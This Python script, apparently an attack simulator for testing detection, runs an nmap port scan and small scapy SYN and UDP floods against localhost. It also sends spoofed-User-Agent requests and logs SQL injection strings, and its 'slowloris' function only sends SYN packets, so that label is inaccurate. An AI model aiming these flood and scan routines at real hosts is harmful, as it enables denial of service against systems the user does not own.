import logging
import time
import nmap
import csv
import random
import os
import argparse
import requests
from scapy.all import IP, TCP, UDP, send

LOG_TXT = "attack_logs.txt"
LOG_CSV = "attack_logs.csv"
TARGET_IP = "127.0.0.1"  # Keep this local for safe testing
PACKET_COUNT = 50

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

def ensure_csv_header():
    if not os.path.exists(LOG_CSV) or os.path.getsize(LOG_CSV) == 0:
        with open(LOG_CSV, "w", newline="") as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow(["Timestamp", "Attack Type", "Target IP", "Target Port", "Status"])

def log_attack(attack_type, ip, port=None, status="Launched"):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    port_str = f":{port}" if port else ""
    log_msg = f"{timestamp} - {attack_type} Attack on {ip}{port_str}"
    
    logging.info(log_msg)
    with open(LOG_TXT, "a") as f:
        f.write(log_msg + "\n")
    with open(LOG_CSV, "a", newline="") as csvfile:
        writer = csv.writer(csvfile)
        writer.writerow([timestamp, attack_type, ip, port or "-", status])

def syn_flood(target_ip, target_port):
    log_attack("SYN Flood", target_ip, target_port)
    for _ in range(PACKET_COUNT):
        packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S")
        send(packet, verbose=False)

def udp_flood(target_ip, target_port):
    log_attack("UDP Flood", target_ip, target_port)
    for _ in range(PACKET_COUNT):
        packet = IP(dst=target_ip) / UDP(dport=target_port) / ("X" * random.randint(20, 100))
        send(packet, verbose=False)

def slowloris_attack(target_ip, target_port):
    log_attack("Slowloris", target_ip, target_port)
    for _ in range(10):
        packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S")
        send(packet, verbose=False)

def fake_bot_traffic():
    log_attack("Fake Bot Traffic", TARGET_IP)
    headers = {
        "User-Agent": random.choice([
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "Mozilla/5.0 (Linux; Android 11)",
        ])
    }
    try:
        for _ in range(5):
            requests.get("http://127.0.0.1", headers=headers, timeout=1)
    except:
        pass  # Intentionally ignore timeouts
    logging.info("Fake Bot Traffic simulated with spoofed User-Agents.")

def sql_injection_simulation():
    payloads = ["' OR 1=1 --", "admin' --", "' OR 'a'='a"]
    for payload in payloads:
        log_attack("SQL Injection", TARGET_IP, status=f"Payload={payload}")
        logging.info(f"SQL Injection Attempt: payload={payload}")
        time.sleep(1)

def scan_and_attack(target=TARGET_IP):
    logging.info("🚨 Attack Simulation Starting")
    ensure_csv_header()

    sql_injection_simulation()
    fake_bot_traffic()

    logging.info(f"Scanning open ports on {target}...")
    try:
        nm = nmap.PortScanner()
        nm.scan(hosts=target, arguments="-p 1-1024 --open")
    except Exception as e:
        logging.warning(f"Port scan failed: {e}")
        return

    open_ports = []
    if target in nm.all_hosts():
        for proto in nm[target].all_protocols():
            open_ports.extend(nm[target][proto].keys())
    else:
        logging.warning(f"Could not detect target {target}. Skipping attack.")
        return

    if not open_ports:
        logging.warning("No open ports found. Skipping port-based attacks.")
        return

    logging.info(f"🎯 Target Ports: {open_ports}")
    for port in open_ports:
        syn_flood(target, port)
        time.sleep(1)
        udp_flood(target, port)
        time.sleep(1)
        slowloris_attack(target, port)
        time.sleep(1)
        fake_bot_traffic()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--loop", action="store_true", help="Continuously run attacks in a loop")
    args = parser.parse_args()

    while True:
        try:
            scan_and_attack()
        except Exception as e:
            logging.error(f"[Attack Simulator] Error occurred: {e}", exc_info=True)
            print(f"[Attack Simulator] Error occurred: {e}. Continuing...")
        if not args.loop:
            break
        time.sleep(60)  # Delay before next round
